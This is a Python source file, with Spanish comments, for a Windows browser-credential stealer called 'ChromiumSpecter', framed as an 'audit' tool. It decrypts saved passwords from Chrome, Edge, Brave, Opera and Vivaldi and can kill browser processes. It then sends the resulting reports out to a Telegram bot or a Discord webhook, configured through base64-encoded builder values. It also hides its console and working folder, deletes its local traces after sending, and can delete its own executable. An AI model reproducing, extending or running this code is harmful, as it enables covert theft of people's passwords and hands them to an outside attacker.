import os
import sys
import json
import html
import base64
import socket
import getpass
import importlib
import sqlite3
import shutil
import csv
import ctypes
import logging
import argparse
import requests
import time
import multiprocessing
from pathlib import Path
from datetime import datetime

__version__ = "1.4.0"

# =========================================================================
# ⚙️ CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
# =========================================================================
CONFIG = {
    "tg_token":   "",  
    "tg_chat_id": "",  
    "ds_webhook": "",  
    "stealth":       False,
    "auto_exfil":    True,
    "output_dir":    ".audit",
    "delay":         1,
    "send_delay":    2,
    "webhook_timeout": 15,
    "self_destruct":   False
}
# =========================================================================

if sys.platform != "win32":
    sys.exit(1)

def safe_b64_decode(val):
    if not val: return ""
    try:
        return base64.b64decode(val, validate=True).decode('utf-8')
    except: return val

try:
    win32crypt = importlib.import_module('win32crypt')
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

def _get_base_dir() -> Path:
    if getattr(sys, 'frozen', False):
        return Path(sys.executable).parent
    return Path(__file__).parent

def _setup_environment(output_path: str, start_logging: bool = False):
    base = _get_base_dir()
    out_dir = base / output_path
    
    # Asegurar directorio
    for candidate in (out_dir, Path(os.environ.get('APPDATA', os.getcwd())) / output_path):
        try:
            candidate.mkdir(exist_ok=True, parents=True)
            # Intentar ocultar en Windows
            try:
                existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
                if existing != 0xFFFFFFFF:
                    ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
            except: pass

            if start_logging:
                log_file = candidate / "pentest_audit.log"
                # Limpiar handlers previos para evitar duplicados o bloqueos
                root = logging.getLogger()
                for handler in root.handlers[:]:
                    root.removeHandler(handler)
                
                handlers = [logging.FileHandler(log_file, encoding='utf-8')]
                try:
                    if sys.stdout and sys.stdout.isatty():
                        handlers.append(logging.StreamHandler(sys.stdout))
                except: pass
                logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', handlers=handlers)
            
            return candidate
        except: continue
    return out_dir

def shutdown_logging():
    root = logging.getLogger()
    for handler in root.handlers[:]:
        handler.close()
        root.removeHandler(handler)

logger = logging.getLogger("AuditorCore")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Reporte de Auditoría Chromium</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; margin: 40px; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th:nth-child(1), td:nth-child(1), th:nth-child(2), td:nth-child(2) { white-space: nowrap; width: 1%; }
        td:nth-child(3), td:nth-child(4), td:nth-child(5) { word-break: break-all; }
        th { background-color: #3498db; color: white; }
        tr:hover { background-color: #f1f1f1; }
        .browser-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }
        .chrome { background-color: #ffeb3b; color: #333; }
        .edge { background-color: #03a9f4; color: white; }
        .brave { background-color: #ff5722; color: white; }
        .opera { background-color: #f44336; color: white; }
        .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
        .skipped { color: #aaa; font-style: italic; }
        .actions { margin: 20px 0; text-align: right; }
        .btn-export { background-color: #27ae60; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background 0.3s; text-decoration: none; display: inline-block; }
        .btn-export:hover { background-color: #2ecc71; }
    </style>
    <script>
        function exportToCSV() {
            let csv = [];
            csv.push("# Reporte de Auditoria Chromium");
            const tables = document.querySelectorAll("table");
            tables.forEach((table, index) => {
                if(index > 0) csv.push("\\n# --- SECCION SIGUIENTE ---");
                const rows = table.querySelectorAll("tr");
                rows.forEach(row => {
                    const cols = row.querySelectorAll("td, th");
                    const rowData = [];
                    cols.forEach(col => {
                        let text = col.innerText.replace(/(\\r\\n|\\n|\\r)/gm, "").trim();
                        text = text.replace(/"/g, '""');
                        rowData.push('"' + text + '"');
                    });
                    csv.push(rowData.join(","));
                });
            });
            const csvFile = new Blob([csv.join("\\n")], {type: "text/csv;charset=utf-8;"});
            const downloadLink = document.createElement("a");
            downloadLink.download = "audit_export_" + new Date().toISOString().replace(/[:.]/g, "-") + ".csv";
            downloadLink.href = window.URL.createObjectURL(csvFile);
            downloadLink.style.display = "none";
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>ChromiumSpecter — Auditoría Táctica de Credenciales</h1>
        <div style="background:#f8f9fa; border-left:4px solid #3498db; padding:12px 16px; margin-bottom:16px; font-size:0.92em; border-radius:0 4px 4px 0;">
            <strong>Metadatos del Reporte</strong><br>
            Fecha: <b>{{date}}</b> &nbsp;|&nbsp; Host: <b>{{hostname}}</b> &nbsp;|&nbsp; Usuario: <b>{{username}}</b> &nbsp;|&nbsp; PID: <b>{{pid}}</b> &nbsp;|&nbsp; Versión: <b>{{version}}</b><br>
            Credenciales válidas: <b>{{total}}</b> &nbsp;|&nbsp; Filtradas: <b>{{filtered_count}}</b>
        </div>
        <div class="actions"><button onclick="exportToCSV()" class="btn-export">📊 Exportar a CSV</button></div>
        <table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{{rows}}</tbody></table>
        {{filtered_section}}
        <div class="footer">Suite de Auditoría Profesional <span class="skipped">{{skipped_note}}</span></div>
    </div>
</body>
</html>
"""

REQUEST_TIMEOUT = 15
MAX_RETRIES     = 3
VALID_URL_PREFIXES = ('http://', 'https://')

def retry_request(func):
    def wrapper(*args, **kwargs):
        for i in range(MAX_RETRIES):
            try: return func(*args, **kwargs)
            except Exception as e: logger.warning(f"Intento {i+1} fallido: {e}")
        return False
    return wrapper

class Exfiltrator:
    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None, timeout=None):
        # Fallback a CONFIG si no se pasan parámetros (para auto-exfiltración con defaults)
        self.tg_token = telegram_token if telegram_token else CONFIG["tg_token"]
        self.tg_id    = telegram_chat_id if telegram_chat_id else CONFIG["tg_chat_id"]
        self.ds_hook  = discord_webhook if discord_webhook else CONFIG["ds_webhook"]
        self.timeout  = timeout if timeout is not None else CONFIG["webhook_timeout"]

        # Si vienen codificados (desde el Builder), decodificarlos
        if self.tg_token and ":" not in self.tg_token: 
            try: self.tg_token = safe_b64_decode(self.tg_token)
            except: pass
        if self.tg_id and not self.tg_id.startswith(("-", "1", "2", "3", "4", "5", "6", "7", "8", "9")):
            try: self.tg_id = safe_b64_decode(self.tg_id)
            except: pass
        if self.ds_hook and not self.ds_hook.startswith("http"):
            try: self.ds_hook = safe_b64_decode(self.ds_hook)
            except: pass

    def send_files(self, file_paths):
        """Sends files with an optional inter-file delay for stealth."""
        if not file_paths: return
        
        for i, path in enumerate(file_paths):
            if i > 0 and CONFIG["send_delay"] > 0:
                logger.info(f"Esperando {CONFIG['send_delay']}s antes del siguiente envío...")
                time.sleep(CONFIG["send_delay"])
                
            try:
                if self.ds_hook: self.send_to_discord(path)
                if self.tg_token and self.tg_id: self.send_to_telegram(path)
            except Exception as e:
                logger.error(f"Error enviando {path}: {e}")

    @retry_request
    def send_to_telegram(self, file_path):
        if not self.tg_token or not self.tg_id: return False
        url = f"https://api.telegram.org/bot{self.tg_token}/sendDocument"
        with open(file_path, 'rb') as f:
            r = requests.post(url, data={'chat_id': self.tg_id}, files={'document': f}, timeout=self.timeout)
        return r.status_code == 200

    @retry_request
    def send_to_discord(self, file_path):
        if not self.ds_hook: return False
        with open(file_path, 'rb') as f:
            r = requests.post(self.ds_hook, files={'file': f}, timeout=self.timeout)
        return r.status_code in (200, 204)

    def self_destruct(self):
        """Schedules the executable for deletion after process exit."""
        if not getattr(sys, 'frozen', False):
            logger.info("Autodestrucción omitida (Modo Script).")
            return
            
        exe_path = sys.executable
        logger.info("💥 Iniciando protocolo de autodestrucción...")
        
        # Comando para esperar a que el proceso muera y borrar el archivo
        # Usamos 'start /b' para que corra en segundo plano totalmente invisible
        cmd = f'start /b "" cmd /c "timeout /t 3 /nobreak > NUL & del /f /q \\"{exe_path}\\""'
        import subprocess
        subprocess.Popen(cmd, shell=True)
        sys.exit(0)

class ChromiumDecryptor:
    # Perfiles válidos de Chromium (Default + Profile N)
    _PROFILE_NAMES = {"Default", "Guest Profile"}

    def __init__(self):
        self.local   = Path(os.environ.get('LOCALAPPDATA', ''))
        self.roaming = Path(os.environ.get('APPDATA', ''))
        # Cada entrada: (nombre_display, base_path, usa_subperfiles)
        self.browsers = {
            "Chrome":   (self.local   / "Google/Chrome/User Data",           True),
            "Edge":     (self.local   / "Microsoft/Edge/User Data",          True),
            "Brave":    (self.local   / "BraveSoftware/Brave-Browser/User Data", True),
            "Vivaldi":  (self.local   / "Vivaldi/User Data",                 True),
            "Opera":    (self.roaming / "Opera Software/Opera Stable",       False),
            "Opera GX": (self.roaming / "Opera Software/Opera GX Stable",   False),
        }
        self.browser_processes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"]

    # ── Infraestructura ───────────────────────────────────────────────────────

    def kill_browsers(self):
        """Cierra forzosamente procesos de navegador para liberar bloqueos de BD."""
        import subprocess
        for proc in self.browser_processes:
            try:
                subprocess.run(f"taskkill /F /IM {proc} /T", shell=True, capture_output=True)
            except Exception: pass

    # ── Obtención de Llave AES ─────────────────────────────────────────────────

    def get_key(self, user_data_path: Path):
        """
        Extrae y descifra la master key AES del Local State.
        Retorna (aes_key: bytes | None, dpapi_available: bool).
        
        - aes_key=None + dpapi_available=True  → perfil legacy, solo DPAPI
        - aes_key=bytes + dpapi_available=True  → perfil moderno, ambos modos posibles
        - aes_key=None + dpapi_available=False  → entorno sin soporte (sin win32crypt)
        """
        dpapi_available = bool(win32crypt)
        ls = user_data_path / "Local State"

        if not ls.exists():
            logger.debug(f"Local State no encontrado en: {user_data_path}")
            return None, dpapi_available

        try:
            with open(ls, "r", encoding="utf-8") as f:
                config = json.load(f)
        except Exception as e:
            logger.warning(f"Error leyendo Local State ({user_data_path}): {e}")
            return None, dpapi_available

        encrypted_key_b64 = config.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            logger.debug(f"No hay os_crypt.encrypted_key en: {user_data_path}")
            return None, dpapi_available

        try:
            raw = base64.b64decode(encrypted_key_b64)
            # Los primeros 5 bytes son el literal ASCII "DPAPI"
            if not raw.startswith(b"DPAPI"):
                logger.warning(f"Prefijo DPAPI inesperado en Local State: {user_data_path}")
                return None, dpapi_available

            encrypted = raw[5:]
            if not win32crypt:
                logger.debug("win32crypt no disponible, no se puede descifrar master key")
                return None, False

            aes_key = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
            logger.debug(f"Master key AES obtenida ({len(aes_key)} bytes) para: {user_data_path}")
            return aes_key, True

        except Exception as e:
            logger.warning(f"Error descifrando master key en {user_data_path}: {e}")
            return None, dpapi_available

    # ── Descifrado por Blob ────────────────────────────────────────────────────

    def decrypt(self, blob: bytes, aes_key: bytes | None) -> str:
        """
        Descifra un blob individual de password_value de Chromium.

        Soporta ambos esquemas simultáneamente en la misma BD:
          - AES-GCM (v80+): prefijo b'v10' | nonce(12) | ciphertext | tag(16)
          - DPAPI legacy  : blob DPAPI directo (sin prefijo v10)

        Retorna texto plano, o un marcador descriptivo si falla.
        Nunca retorna basura binaria.
        """
        if not blob:
            return ""

        # ── AES-GCM (Chromium v80+, prefijo v10 o v11) ───────────────────────
        if blob[:3] in (b"v10", b"v11"):
            if not aes_key:
                logger.debug("Blob AES-GCM sin llave disponible")
                return "[Sin Llave AES]"

            if len(blob) < 3 + 12 + 16:      # mínimo viable: prefijo + nonce + tag vacío
                logger.debug(f"Blob AES-GCM demasiado corto ({len(blob)} bytes)")
                return "[Blob Inválido]"

            nonce      = blob[3:15]
            ciphertext = blob[15:-16]
            tag        = blob[-16:]

            try:
                cipher = AES.new(aes_key, AES.MODE_GCM, nonce)
                plain  = cipher.decrypt_and_verify(ciphertext, tag)
                return plain.decode("utf-8", errors="replace").strip()
            except Exception as e:
                logger.debug(f"AES-GCM falló (llave incorrecta o blob corrupto): {e}")
                # El blob tiene prefijo v10 pero la llave no lo descifra.
                # Intentamos DPAPI por si es un blob migrado a medias.
                if win32crypt:
                    try:
                        raw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
                        return raw.decode("utf-8", errors="replace").strip()
                    except Exception:
                        pass
                return "[Error AES-GCM]"

        # ── DPAPI Legacy (Chrome <v80, o entrada no migrada) ──────────────────
        if win32crypt:
            try:
                raw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
                return raw.decode("utf-8", errors="replace").strip()
            except Exception as e:
                logger.debug(f"DPAPI legacy falló: {e}")

        return "[Sin Descifrar]"

    # ── Descubrimiento de Perfiles ─────────────────────────────────────────────

    def _scan_profiles(self, base: Path, multi_profile: bool) -> list[Path]:
        """
        Retorna las rutas de perfil que contienen un archivo 'Login Data'.
        Para navegadores con multi-perfil escanea subdirectorios.
        Para Opera/sin subdirectorio usa la raíz directamente.
        """
        profiles = []

        if not base.exists():
            return profiles

        if multi_profile:
            try:
                for p in base.iterdir():
                    if not p.is_dir():
                        continue
                    # Default, Guest Profile, y Profile N
                    if p.name in self._PROFILE_NAMES or p.name.startswith("Profile "):
                        db = p / "Login Data"
                        if db.exists() and db.stat().st_size > 0:
                            profiles.append(p)
            except PermissionError as e:
                logger.warning(f"Sin permiso para escanear {base}: {e}")
        else:
            # Opera y similares guardan Login Data en la raíz de User Data
            db = base / "Login Data"
            if db.exists() and db.stat().st_size > 0:
                profiles.append(base)

        return profiles

    def find_targets(self) -> list[dict]:
        """
        Descubre todos los perfiles de navegador con credenciales.
        Cada target incluye: nombre, perfil, ruta de DB, llave AES (puede ser None),
        y si DPAPI está disponible para descifrar entradas legacy.
        """
        targets = []
        for browser_name, (base_path, multi_profile) in self.browsers.items():
            if not base_path.exists():
                continue

            # La llave AES se obtiene una vez por navegador (del Local State raíz)
            aes_key, dpapi_ok = self.get_key(base_path)

            if not aes_key and not dpapi_ok:
                logger.info(f"[{browser_name}] Sin capacidad de descifrado, omitiendo.")
                continue

            if not aes_key:
                logger.debug(f"[{browser_name}] Solo modo DPAPI (sin master key AES).")

            profiles = self._scan_profiles(base_path, multi_profile)

            if not profiles:
                logger.debug(f"[{browser_name}] No se encontraron perfiles con Login Data.")
                continue

            for profile_path in profiles:
                targets.append({
                    "name":        browser_name,
                    "profile":     profile_path.name,
                    "db_path":     profile_path / "Login Data",
                    "key":         aes_key,
                    "dpapi_ok":    dpapi_ok,
                })

        logger.debug(f"Total targets encontrados: {len(targets)}")
        return targets

    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None, callback=None, auto_kill=False, webhook_timeout=15):
        def log(msg, level="info"):
            if callback: callback(msg, level)
            else: getattr(logger, level)(msg)

        log("Iniciando escaneo de objetivos...")
        targets = self.find_targets()
        if browser_filter:
            targets = [t for t in targets if browser_filter.lower() in t['name'].lower()]

        log(f"Encontrados {len(targets)} perfiles para procesar.")
        data, filtered = [], []

        for t in targets:
            log(f"Auditando: {t['name']} ({t['profile']})", "info")
            # UUID por operación para evitar colisión si se llama en paralelo
            import uuid
            tmp = output_dir / f"tmp_{uuid.uuid4().hex}.db"
            conn = None
            try:
                shutil.copy2(t['db_path'], tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                log(f"  [{t['name']}] {len(rows)} entradas encontradas.")

                for row in rows:
                    url, user, blob = row[0], row[1], row[2]
                    # Descarta entradas sin URL o sin usuario (no son credenciales útiles)
                    if not url or not user:
                        continue
                    # Un blob vacío puede ocurrir en perfiles de Google sin contraseña guardada
                    if not blob:
                        continue

                    pwd = self.decrypt(blob, t['key'])
                    entry = [t['name'], t['profile'], url, user, pwd]

                    if url.startswith(VALID_URL_PREFIXES):
                        data.append(entry)
                    else:
                        filtered.append(entry)

            except Exception as e:
                log(f"Error procesando {t['name']}/{t['profile']}: {e}", "warning")
            finally:
                if conn:
                    conn.close()
                tmp.unlink(missing_ok=True)

        # ── Fallback: reintentar con cierre de navegadores ────────────────────
        if not data and not filtered and auto_kill:
            log("Sin datos. Reintentando con cierre forzado de navegadores...", "warning")
            self.kill_browsers()
            time.sleep(1.5)
            return self.audit(output_dir, skip_html, skip_csv, browser_filter, callback, auto_kill=False)

        if not data and not filtered:
            return None, None, None

        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        h_p = output_dir / f"audit_report_{stamp}.html" if not skip_html else None
        c_p = output_dir / f"audit_report_{stamp}.csv" if not skip_csv else None

        if h_p:
            r_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in data])
            f_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in filtered])
            f_s = f'<h2 style="margin-top:40px;color:#e67e22;border-bottom:2px solid #e67e22;">Entradas Filtradas</h2><table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{f_h}</tbody></table>' if filtered else ""
            content = (HTML_TEMPLATE.replace("{{total}}", str(len(data))).replace("{{filtered_count}}", str(len(filtered)))
                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", socket.gethostname())
                       .replace("{{username}}", getpass.getuser()).replace("{{pid}}", str(os.getpid()))
                       .replace("{{version}}", __version__).replace("{{rows}}", r_h).replace("{{filtered_section}}", f_s)
                       .replace("{{skipped_note}}", f" ({len(filtered)} filtrados)" if filtered else ""))
            with open(h_p, "w", encoding='utf-8') as f: f.write(content)

        if c_p:
            with open(c_p, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow([f"# Reporte Auditoria | Host: {socket.gethostname()} | User: {getpass.getuser()} | Ver: {__version__}"])
                w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                w.writerows(data)
                if filtered:
                    w.writerow([]); w.writerow(["# --- FILTRADOS ---"])
                    w.writerows(filtered)
        return (data + filtered), h_p, c_p

def main():
    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}")
    ex = parser.add_argument_group("Exfiltración")
    ex.add_argument("--webhook", help="Discord Webhook")
    ex.add_argument("--tg-token", help="Telegram Token")
    ex.add_argument("--tg-chat-id", help="Telegram Chat ID")
    ex.add_argument("--no-exfil", action="store_true")
    
    re = parser.add_argument_group("Reportes")
    re.add_argument("--no-html", action="store_true")
    re.add_argument("--no-csv", action="store_true")
    re.add_argument("--json", action="store_true")
    re.add_argument("--output-dir", default=CONFIG["output_dir"])
    
    en = parser.add_argument_group("Motor")
    en.add_argument("--browser", help="Filtro de navegador (ej: brave, chrome)")
    en.add_argument("--delay", type=int, default=CONFIG["delay"])
    en.add_argument("--clean", action="store_true")
    en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"],
                    help="Oculta la ventana de consola inmediatamente al arrancar usando ShowWindow (Modo Sigilo).")
    en.add_argument("--auto-kill", action="store_true", help="Cerrar navegadores automáticamente si falla la lectura")
    en.add_argument("--no-wipe", action="store_true", help="No eliminar archivos locales tras exfiltrar")
    en.add_argument("--self-destruct", action="store_true", default=CONFIG["self_destruct"], help="Eliminar el ejecutable tras finalizar")
    en.add_argument("--debug", action="store_true", help="Activar logs detallados")
    
    args = parser.parse_args()
    
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.stealth and sys.platform == "win32":
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    
    out = _setup_environment(args.output_dir, start_logging=True)
    if args.clean:
        for ext in ("*.html", "*.csv", "*.json"):
            for f in out.glob(ext): f.unlink()
        return
    
    if args.delay > 0:
        time.sleep(args.delay)
    
    ds_w = args.webhook or safe_b64_decode(CONFIG["ds_webhook"])
    tg_t = args.tg_token or safe_b64_decode(CONFIG["tg_token"])
    tg_c = args.tg_chat_id or safe_b64_decode(CONFIG["tg_chat_id"])
    
    auditor = ChromiumDecryptor()
    results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser, auto_kill=args.auto_kill)
    
    if results and args.json:
        jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
    
    # auto_exfil puede ser desactivado desde el CONFIG embebido (Builder) o con --no-exfil
    if results and not args.no_exfil and CONFIG["auto_exfil"]:
        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
        files = [p for p in (hp, cp) if p and p.exists()]
        if files:
            exf.send_files(files)
            # Auto-wipe local reports tras exfiltrar, a menos que --no-wipe esté activo
            if not args.no_wipe and (tg_t or ds_w):
                for p in files:
                    p.unlink(missing_ok=True)
        
        if args.self_destruct:
            exf.self_destruct()

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()